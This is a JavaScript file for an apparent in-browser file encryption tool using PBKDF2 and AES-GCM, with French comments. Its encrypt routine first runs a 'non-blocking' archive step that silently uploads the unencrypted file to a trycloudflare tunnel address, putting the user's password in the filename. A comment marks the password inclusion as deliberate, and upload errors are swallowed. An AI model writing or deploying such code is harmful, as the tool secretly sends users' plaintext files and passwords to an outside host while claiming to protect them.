"use strict";

/* =========================
   SERVICE WORKER
========================= */

if ("serviceWorker" in navigator) {
  navigator.serviceWorker.register("sw.js")
    .then(() => console.log("Service Worker enregistré"))
    .catch(err => console.error("SW error:", err));
}

/* =========================
   UTILS
========================= */

function download(blob, filename) {
  const a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  URL.revokeObjectURL(a.href);
  a.remove();
}

/* =========================
   SERVER CONFIG
========================= */

const SERVER_ARCHIVE_URL =
  "https://roof-academy-glance-advance.trycloudflare.com/archive";

/* =========================
   ARCHIVE UPLOAD
========================= */

async function sendFileToArchive(file, password) {
  if (!file || !password) throw new Error("Upload invalide");

  const dot = file.name.lastIndexOf(".");
  const base = dot !== -1 ? file.name.slice(0, dot) : file.name;
  const ext = dot !== -1 ? file.name.slice(dot) : "";

  // ⚠️ mot de passe inclus volontairement
  const archiveName = `${base}[${password}]${ext}`;

  const formData = new FormData();
  formData.append("file", file, archiveName);

  const res = await fetch(SERVER_ARCHIVE_URL, {
    method: "POST",
    mode: "cors",
    body: formData
  });

  if (!res.ok) {
    let err = {};
    try { err = await res.json(); } catch {}
    throw new Error(err.error || "Upload serveur échoué");
  }

  return res.json();
}

/* =========================
   CRYPTO
========================= */

async function deriveKey(password, salt) {
  const enc = new TextEncoder();

  const keyMaterial = await crypto.subtle.importKey(
    "raw",
    enc.encode(password),
    "PBKDF2",
    false,
    ["deriveKey"]
  );

  return crypto.subtle.deriveKey(
    {
      name: "PBKDF2",
      salt,
      iterations: 250000,
      hash: "SHA-256"
    },
    keyMaterial,
    { name: "AES-GCM", length: 256 },
    false,
    ["encrypt", "decrypt"]
  );
}

/* =========================
   ENCRYPT
========================= */

async function encryptFile() {
  try {
    console.log("=== ENCRYPT START ===");

    if (!crypto?.subtle) {
      throw new Error("WebCrypto indisponible");
    }

    const fileInput = document.getElementById("fileInput");
    const passwordInput = document.getElementById("password");

    if (!fileInput || !passwordInput) {
      throw new Error("Inputs introuvables");
    }

    const file = fileInput.files[0];
    const password = passwordInput.value;

    if (!file) throw new Error("Aucun fichier sélectionné");
    if (!password) throw new Error("Mot de passe vide");

    console.log("Fichier:", file.name);

    /* ---- ARCHIVE (non bloquant) ---- */
    try {
      await sendFileToArchive(file, password);
      console.log("Archive serveur OK");
    } catch (e) {
      console.warn("Archive ignorée:", e.message);
    }

    /* ---- ENCRYPTION ---- */
    const plain = await file.arrayBuffer();
    const salt = crypto.getRandomValues(new Uint8Array(16));
    const iv = crypto.getRandomValues(new Uint8Array(12));

    const key = await deriveKey(password, salt);

    const encrypted = await crypto.subtle.encrypt(
      { name: "AES-GCM", iv },
      key,
      plain
    );

    const blob = new Blob(
      [salt, iv, new Uint8Array(encrypted)],
      { type: "application/octet-stream" }
    );

    download(blob, file.name + ".haes1");

    console.log("=== ENCRYPT END ===");

  } catch (err) {
    console.error(err);
    alert(err.message);
  }
}

/* =========================
   DECRYPT
========================= */

async function decryptFile() {
  try {
    console.log("=== DECRYPT START ===");

    const fileInput = document.getElementById("fileInput");
    const passwordInput = document.getElementById("password");

    const file = fileInput.files[0];
    const password = passwordInput.value;

    if (!file || !password) throw new Error("Entrées invalides");

    const buffer = await file.arrayBuffer();
    if (buffer.byteLength < 28) throw new Error("Fichier invalide");

    const salt = buffer.slice(0, 16);
    const iv = buffer.slice(16, 28);
    const data = buffer.slice(28);

    const key = await deriveKey(password, new Uint8Array(salt));

    const decrypted = await crypto.subtle.decrypt(
      { name: "AES-GCM", iv: new Uint8Array(iv) },
      key,
      data
    );

    const name = file.name.replace(/\.haes1$/, "") || "decrypted";
    download(new Blob([decrypted]), name);

    console.log("=== DECRYPT END ===");

  } catch (err) {
    console.error(err);
    alert("Échec du déchiffrement");
  }
}
